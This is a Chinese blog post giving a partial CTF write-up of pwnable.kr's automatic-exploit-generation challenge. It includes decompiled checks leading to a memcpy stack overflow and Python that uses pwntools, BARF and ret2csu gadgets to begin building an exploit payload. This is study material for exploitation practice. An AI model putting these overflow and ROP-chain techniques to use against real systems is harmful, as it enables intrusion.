<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    
    
    <title>pwnable.kr aeg自解 | DaJun的Blog | 脑袋空空</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="keywords" content="pwn,aeg">
    <link rel="shortcut icon" href="/img/girl.ico">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
    
    <script type="text/javascript">
        // Data Center
        var DC = {
            reward:	false,
            lv: JSON.parse('{"enable":true,"app_id":"ekgad1tINypClpAa8y0wrbvl-gzGzoHsz","app_key":"Qn93YchF3LXlS54tbXjzMvAI","icon":true}'),
            v: JSON.parse('{"enable":true,"appid":"ekgad1tINypClpAa8y0wrbvl-gzGzoHsz","appkey":"Qn93YchF3LXlS54tbXjzMvAI","notify":true,"verify":true,"placeholder":"想说什么...","avatar":"wavatar"}'),
            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
            d: JSON.parse('{"app_id":null}')
        };
    </script>
    <script type="text/javascript">
        window.lazyScripts=[];
    </script>
    
</head>


<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="">
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap">
      
      <img src="/img/brand.jpg" class="brand-bg">
      
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/girl.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">DaJun</h5>
          <a href="mailto:571986260@qq.com" title="571986260@qq.com" class="mail">
            
              <span>5</span>
            
              <span>7</span>
            
              <span>1</span>
            
              <span>9</span>
            
              <span>8</span>
            
              <span>6</span>
            
              <span>2</span>
            
              <span>6</span>
            
              <span>0</span>
            
              <span>@</span>
            
              <span>q</span>
            
              <span>q</span>
            
              <span>.</span>
            
              <span>c</span>
            
              <span>o</span>
            
              <span>m</span>
            
          </a>
        </hgroup>
        
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                HOME
              </a>
            </li>
        
            <li class="">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                CATEGORIES
              </a>
            </li>
        
            <li class="">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                TAGS
              </a>
            </li>
        
            <li class="">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                ARCHIVES
              </a>
            </li>
        
            <li class="">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                ABOUT
              </a>
            </li>
        
            <li class="">
              <a href="/pwn-tips"  >
                <i class="icon icon-lg icon-info"></i>
                PWN TIPS
              </a>
            </li>
        
            <li class="">
              <a href="/todo"  >
                <i class="icon icon-lg icon-clock-o"></i>
                TODO
              </a>
            </li>
        
            <li class="">
              <a href="https://github.com/DayJun" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row clearfix">
        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">
            <span>pwnable.kr aeg自解</span>
            
        </div>
        
        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
            <i class="icon icon-lg icon-search"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">
    <img src="/img/dawn.jpg" class="header-bg">
    <div class="container fade-scale">
        <h1 class="title">pwnable.kr aeg自解</h1>
        <h5 class="subtitle">
            
                <time datetime="2020-01-23T05:49:48.000Z" itemprop="datePublished" class="page-time">
  2020-01-23
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/writeup/">writeup</a></li></ul>

            
        </h5>
        
    </div>
    

</header>

<div id="site_search">
    <div class="search-title clearfix">
        <span class="pull-left">
          <i class="icon icon-lg icon-search"></i>
        </span>
        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
          <i class="icon icon-lg icon-close"></i>
        </a>
    </div>
    <div id="local-search-result"></div>
</div>


<div class="container body-wrap">
    <article id="post-pwnable-kr-aeg自解"
  class="post-article article-type-post" itemprop="blogPost">
    <div class="post-card">
        <h1 class="post-card-title">pwnable.kr aeg自解</h1>
        <div class="post-meta">
            <time class="post-time" title="2020-01-23 13:49:48" datetime="2020-01-23T05:49:48.000Z"  itemprop="datePublished">2020-01-23</time>

            
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/writeup/">writeup</a></li></ul>



            
	<span id="/2020/01/23/pwnable-kr-aeg自解/" class="leancloud_visitors" data-flag-title="pwnable.kr aeg自解" title="pwnable.kr aeg自解">
		
			<i class="icon icon-eye"></i>
		
		<span class="leancloud-visitors-count"></span>
	</span>
 

            
    <span class="leancloud-comment">
        <i class="icon icon-comment-o"></i>
        <a href="/2020/01/23/pwnable-kr-aeg自解/#comment">
            <span class="valine-comment-count" data-xid="/2020/01/23/pwnable-kr-aeg自解/"></span>
        </a>
    </span>



            
        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            
            <p>最近想要学习自动化解题技术，于是选择了pwnable.kr的aeg一题进行学习</p>
<a id="more"></a>

<h1 id="何为AEG"><a href="#何为AEG" class="headerlink" title="何为AEG"></a>何为AEG</h1><p>AEG全称为Automatic Exploit Generation，意如其名，旨在考验答题者的自动化解题能力</p>
<p>通常AEG的题目的解题过程是这样的：</p>
<ul>
<li>连接到远程端，远程端会发送过来一串base64加密的字符串</li>
<li>接收字符串，进行解密，将解密后的数据保存到本地，得到一个压缩文件</li>
<li>对文件进行解压，得到可执行二进制文件</li>
<li>此时有10秒钟的时间来生成shellcode，时间一过，连接自动断开</li>
</ul>
<p>每次连接所得到的二进制文件都大体相同，但其中存在着许多细节上的不同</p>
<p>因此这里自动化解题的对象并不是一类题，只能说是一道题，因此只需要写出一个针对当前题目的自动生成payload的脚本即可，难度要相对小一些</p>
<h1 id="pwnable-kr-aeg"><a href="#pwnable-kr-aeg" class="headerlink" title="pwnable.kr aeg"></a>pwnable.kr aeg</h1><p>这道题位于Grotesque区，属于中等难度的pwn题目</p>
<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p>先连接一次，得到一个可执行文件，checksec检测一次</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">"rm -rf ./recv.bin, ./recv.decoded"</span>)</span><br><span class="line">io = remote(<span class="string">"pwnable.kr"</span>, <span class="number">9005</span>)</span><br><span class="line">io.recvuntil(<span class="string">'wait...\n'</span>)</span><br><span class="line">data = io.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = base64.b64decode(data)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"recv.bin"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">'zcat ./recv.bin &gt; ./recv.decoded'</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] '/ctf/work/recv.decoded'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>发现只开启了NX，表明可能存在栈溢出漏洞</p>
<h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>IDA打开之后，进去找到main函数，然后F5万能大法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+11h] [rbp-1Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+12h] [rbp-1Eh]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = sub_4565995(<span class="number">1L</span>L, <span class="number">2L</span>L, <span class="number">3L</span>L, <span class="number">4L</span>L, <span class="number">5L</span>L, <span class="number">6L</span>L);</span><br><span class="line">    srand(v4);</span><br><span class="line">    dword_476772C = <span class="built_in">strlen</span>(a2[<span class="number">1</span>]) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( dword_476772C &lt;= <span class="number">1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 = <span class="number">0</span>;</span><br><span class="line">      v14 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">2</span> * dword_476772C &gt; v15 )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = a2[<span class="number">1</span>][v15];</span><br><span class="line">        v8 = a2[<span class="number">1</span>][v15 + <span class="number">1</span>];</span><br><span class="line">        v9 = <span class="number">0</span>;</span><br><span class="line">        v5 = v14++;</span><br><span class="line">        __isoc99_sscanf(&amp;v7, <span class="string">"%02x"</span>, &amp;byte_4767740[v5]);</span><br><span class="line">        v15 += <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; dword_476772C; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)v10 == <span class="number">72</span> &amp;&amp; (_BYTE)v13 == <span class="number">64</span> &amp;&amp; <span class="number">78</span> * (_BYTE)v13 + <span class="number">51</span> * (_BYTE)v10 - (_BYTE)v12 == <span class="number">9</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = v13++;</span><br><span class="line">          v12 = v6;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( i &amp; <span class="number">1</span> )</span><br><span class="line">          byte_4767740[i] ^= <span class="number">0x44</span>u;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          byte_4767740[i] ^= <span class="number">0x7C</span>u;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"payload encoded. let's go!"</span>);</span><br><span class="line">      sub_45658F0((<span class="keyword">unsigned</span> __int8)byte_4767740[<span class="number">0</span>], (<span class="keyword">unsigned</span> __int8)byte_4767741, (<span class="keyword">unsigned</span> __int8)byte_4767742);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"end of program"</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"payload length exceeds 1000byte"</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"usage : ./aeg [hex encoded payload]"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>流程是这样的：</p>
<ul>
<li>检查是否有一个命令行的参数，如果否，则打印usage然后退出</li>
<li>检查参数的长度除以2放入<code>dword_476772C</code>，检测其是否小于等于1000，如果否，则退出</li>
<li>在while循环中，将我们的输入以如下规则转换：字符串的<code>&quot;ab&quot;</code>转换成数字<code>0xab</code>，即两个字节转换成一个字节，放入<code>byte_4767740</code>中</li>
<li>在for循环中，能看到好几句if，但大多数的if是无用操作，用来混淆视听，唯一有用的地方是<code>i&amp;1</code>判断处的<code>if else</code>，这里对输入进行一系列异或加密</li>
<li>加密完之后，执行<code>sub_45658F0</code>函数</li>
</ul>
<h2 id="sub-45658F0函数"><a href="#sub-45658F0函数" class="headerlink" title="sub_45658F0函数"></a><code>sub_45658F0</code>函数</h2><p>第一处函数调用，其参数为加密后的输入前三个字节</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_45658F0((<span class="keyword">unsigned</span> __int8)byte_4767740[<span class="number">0</span>], (<span class="keyword">unsigned</span> __int8)byte_4767741, (<span class="keyword">unsigned</span> __int8)byte_4767742);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> __<span class="function">fastcall <span class="title">sub_45658F0</span><span class="params">(<span class="keyword">char</span> a1, <span class="keyword">char</span> a2, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> result; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  result = a3;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0xE4</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0x4C</span> - a2;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0x1E</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">0x24</span> * a1 + <span class="number">0x29</span> * a2 - a3;</span><br><span class="line">      <span class="keyword">if</span> ( result == <span class="number">0x62</span> )</span><br><span class="line">        result = sub_4565870(</span><br><span class="line">                   (<span class="keyword">unsigned</span> __int8)byte_4767743,</span><br><span class="line">                   (<span class="keyword">unsigned</span> __int8)byte_4767744,</span><br><span class="line">                   (<span class="keyword">unsigned</span> __int8)byte_4767745);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对第一个字节，检测其是否等于<code>0xE4</code></p>
<p>对第二个字节，检测式子<code>0x4C - a2 == 0x1E</code>是否成立</p>
<p>对第三个字节，检测式子<code>0x24 * a1 + 0x29 * a2 - a3 == 0x62</code>是否成立</p>
<p>全部成立之后，进入<code>sub_4565870</code>函数，参数是加密后的输入的第四、五、六个字节</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> __<span class="function">fastcall <span class="title">sub_4565870</span><span class="params">(<span class="keyword">char</span> a1, <span class="keyword">char</span> a2, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> result; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  result = a3;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0xDB</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0x5A</span> - a2;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0x37</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">0x26</span> * a1 + <span class="number">0x25</span> * a2 - a3;</span><br><span class="line">      <span class="keyword">if</span> ( result == <span class="number">0x2A</span> )</span><br><span class="line">        result = sub_45657F3(</span><br><span class="line">                   (<span class="keyword">unsigned</span> __int8)byte_4767746,</span><br><span class="line">                   (<span class="keyword">unsigned</span> __int8)byte_4767747,</span><br><span class="line">                   (<span class="keyword">unsigned</span> __int8)byte_4767748);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处可以看到，这里是套娃式检测，但是检测的条件都变了</p>
<p>就这样一环套一环，一直到最后</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">sub_45651C1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(&amp;dest, &amp;unk_4767770, dword_476772C - <span class="number">48</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里<code>unk_4767770</code>相对加密后输入<code>byte_4767740</code>偏移0x30，<code>dword_476772C</code>是最开始保存的输入长度除以2</p>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>这里我主要使用了<code>z3 barf</code>这两个库</p>
<h3 id="分析得到main函数的basic-blocks"><a href="#分析得到main函数的basic-blocks" class="headerlink" title="分析得到main函数的basic blocks"></a>分析得到main函数的basic blocks</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">binary_name = <span class="string">'./recv.decoded'</span></span><br><span class="line">barf = barf.BARF(binary_name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_main_address</span><span class="params">()</span>:</span></span><br><span class="line">    cfg = barf.recover_cfg()</span><br><span class="line">    start_block = cfg.basic_blocks[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> instr <span class="keyword">in</span> start_block.instrs:</span><br><span class="line">        <span class="keyword">if</span> instr.operands[<span class="number">0</span>].to_string() == <span class="string">'rdi'</span>:</span><br><span class="line">            main_address = int(instr.operands[<span class="number">1</span>].to_string(), <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> main_address</span><br><span class="line">main_address = get_main_address()</span><br><span class="line">cfg = barf.recover_cfg(start=main_address)</span><br><span class="line">basic_blocks = cfg.basic_blocks</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_block</span><span class="params">(addr, basic_blocks)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    从basic blocks中查找以addr为起始地址的block</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> addr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"[-] address can not be None!"</span>)</span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> basic_blocks:</span><br><span class="line">        <span class="keyword">if</span> block.address == addr:</span><br><span class="line">            <span class="keyword">return</span> block</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">"[-] can not find it!"</span>)</span><br></pre></td></tr></table></figure>

<p>我们要从main函数开始分析，所以这一步是必要的</p>
<h3 id="分析得到init-csu的gadget的地址"><a href="#分析得到init-csu的gadget的地址" class="headerlink" title="分析得到init_csu的gadget的地址"></a>分析得到init_csu的gadget的地址</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_init_address</span><span class="params">()</span>:</span></span><br><span class="line">    cfg = barf.recover_cfg()</span><br><span class="line">    start_block = cfg.basic_blocks[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> instr <span class="keyword">in</span> start_block.instrs:</span><br><span class="line">        <span class="keyword">if</span> instr.operands[<span class="number">0</span>].to_string() == <span class="string">'rcx'</span>:</span><br><span class="line">            init_address = int(instr.operands[<span class="number">1</span>].to_string(), <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> init_address</span><br><span class="line">init_address = get_init_address()</span><br><span class="line">init_offset1 = <span class="number">0x5a</span></span><br><span class="line">init_offset2 = <span class="number">0x40</span></span><br><span class="line">init_addr1 = init_address + init_offset1</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">pop     rbx</span></span><br><span class="line"><span class="string">pop     rbp</span></span><br><span class="line"><span class="string">pop     r12</span></span><br><span class="line"><span class="string">pop     r13</span></span><br><span class="line"><span class="string">pop     r14</span></span><br><span class="line"><span class="string">pop     r15</span></span><br><span class="line"><span class="string">retn</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">init_addr2 = init_address + init_offset2</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">mov     rdx, r13</span></span><br><span class="line"><span class="string">mov     rsi, r14</span></span><br><span class="line"><span class="string">mov     edi, r15d</span></span><br><span class="line"><span class="string">call    qword ptr [r12+rbx*8]</span></span><br><span class="line"><span class="string">add     rbx, 1</span></span><br><span class="line"><span class="string">cmp     rbx, rbp</span></span><br><span class="line"><span class="string">jnz     short loc_8731CF0</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, rdx, rsi, rdi)</span>:</span></span><br><span class="line">    gadget = <span class="string">''</span></span><br><span class="line">    gadget += p64(rbx) + p64(rbp) + p64(r12)</span><br><span class="line">    gadget += p64(rdx) + p64(rsi) + p64(rdi)</span><br><span class="line">    <span class="keyword">return</span> gadget</span><br></pre></td></tr></table></figure>

<p>因为源程序中并没有什么可用的gadget，因此使用这里，且这里也相对好找一些</p>
<h3 id="分析得到加密后数据所在的地址"><a href="#分析得到加密后数据所在的地址" class="headerlink" title="分析得到加密后数据所在的地址"></a>分析得到加密后数据所在的地址</h3><p>用IDA的CFG视图对main函数进行查看，可以发现，得到数据地址的块需要走的路径为：</p>
<figure class="image-box">
                <a rel=pwnable.kr aeg自解 href="C:\Users\57198\AppData\Roaming\Typora\typora-user-images\image-20200123152129633.png" title="image-20200123152129633" data-fancybox="images"><img src="C:\Users\57198\AppData\Roaming\Typora\typora-user-images\image-20200123152129633.png" alt="image-20200123152129633" title class></a>
                <p>image-20200123152129633</p>
            </figure>

<p>即<code>start -&gt; taken_branch -&gt; taken_branch -&gt; direct_branch -&gt; taken_branch</code></p>
<p>这里我们可以发现，最后一次取<code>taken_branch</code>之后，相当于进入了while循环，所以我们还得保存住那里的<code>not_taken_branch</code>以便直接走出循环</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">block = find_block(basic_blocks[<span class="number">0</span>].taken_branch, basic_blocks)</span><br><span class="line">block = find_block(block.taken_branch, basic_blocks)</span><br><span class="line">block = find_block(block.direct_branch, basic_blocks)</span><br><span class="line">not_taken_branch = block.not_taken_branch <span class="comment"># 为了走出循环</span></span><br><span class="line">block = find_block(block.taken_branch, basic_blocks)</span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> instr <span class="keyword">in</span> block.instrs:</span><br><span class="line">    <span class="keyword">if</span> instr.mnemonic == <span class="string">'call'</span>:</span><br><span class="line">        index -= <span class="number">5</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">instr = block.instrs[index]</span><br><span class="line">inp_address = int(instr.operands[<span class="number">1</span>].to_string()[<span class="number">5</span>:<span class="number">-1</span>], <span class="number">16</span>)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">call sscanf的之前第五个指令的第二个操作数就包含了加密后数据的地址</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>

